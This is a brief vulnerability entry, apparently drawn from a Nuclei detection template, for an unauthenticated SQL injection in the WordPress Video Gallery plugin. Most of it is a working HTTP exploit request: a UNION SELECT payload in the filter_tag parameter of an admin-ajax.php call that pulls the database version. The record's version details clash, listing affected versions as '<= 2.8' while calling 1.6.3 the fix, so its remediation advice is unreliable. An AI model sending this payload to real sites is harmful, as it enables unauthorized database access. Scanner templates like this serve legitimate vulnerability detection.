# Vulnerability: WordPress Video Gallery <= 2.8 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`contus-video-gallery-sqli.yaml`)

## Description
The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.

## Secure Mitigation
Fixed in version 1.6.3

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 10s
POST /wp-admin/admin-ajax.php?image_id=123 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=GalleryBox&filter_tag=1)" union select * from (select 123)a1 join (select 2)a2 join (select 3)a3 join (select 2)a4 join (select 2)a5  join (select 2)a6 join (select 2)a7 join (select 2)a8 join (select 2)a9 join (select 2)a10 join (select 2)a11 join (select 2)a12 join (select 2)a13 join (select 2)a14 join (select 2)a15 join (select 2)a16 join (select 2)a17 join (select 2)a18 join (select version())a19 join (select md5({{num}}))a20 join (select 2)a21 join (select 2)a22 join (select 2)a23-- -
```

